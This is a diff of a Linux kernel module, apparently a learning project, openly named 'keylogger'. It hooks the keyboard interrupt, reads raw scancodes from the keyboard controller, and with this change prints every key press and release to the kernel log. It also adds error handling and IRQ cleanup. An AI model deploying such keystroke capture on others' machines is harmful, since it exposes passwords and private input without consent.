@@ -6,10 +6,12 @@
 #include <linux/interrupt.h>
 #include <linux/miscdevice.h>
 
-
 #define PATH "keylog"
 #define KEYBOARD_STATUS 0x64
 #define KEYBOARD_DATA 0x60
+#define KBD_IRQ 1
+#define KBD_SCANCODE_MASK   0x7f
+#define KBD_STATUS_MASK     0x80
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("stmartin");
@@ -20,7 +22,6 @@ static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *of
 
 struct dentry		*dir_entry, *file_entry;
 static unsigned short	kbd_buffer = 0x0000;
-static wait_queue_head_t kbd_irq_waitq;
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
@@ -30,15 +31,7 @@ static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, lof
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
-/*	printk(KERN_INFO "in the read\n");
-	DEFINE_WAIT(wait);
-	printk(KERN_INFO "keylogger: after define\n");
-	prepare_to_wait(&kbd_irq_waitq, &wait, TASK_INTERRUPTIBLE);
-	printk(KERN_INFO "keylogger: after prepare\n");
-        //schedule();
-	//printk(KERN_INFO "keylogger: after schedule\n");
-        finish_wait(&kbd_irq_waitq, &wait);
-	printk(KERN_INFO "keylogger: after finish wait\n");*/
+	printk(KERN_INFO "keylogger: in read\n");
 	return 0;
 }
 
@@ -91,7 +84,9 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 	status = inb(KEYBOARD_STATUS);
 	scancode = inb(KEYBOARD_DATA);
 	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
-	wake_up_interruptible(&kbd_irq_waitq);
+	printk(KERN_INFO "Scan Code %x %s\n",
+            scancode & KBD_SCANCODE_MASK,
+            scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
 	return IRQ_HANDLED;
 }
 
@@ -111,9 +106,12 @@ static int		__init keylogger_init(void)
 	if (misc_register(&key_dev))
 		return 1;
 	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
-	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
+	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
+	{
+		printk(KERN_INFO "something went wrong in request_irq\n");
+		return 1;
+	}
 	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
-	init_waitqueue_head(&kbd_irq_waitq);
 
 	return 0;
 }
@@ -121,6 +119,7 @@ static int		__init keylogger_init(void)
 static void		__exit keylogger_exit(void)
 {
 	printk(KERN_INFO "exit keylogger\n");
+	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
 	debugfs_remove_recursive(dir_entry);
 	misc_deregister(&key_dev);
 }
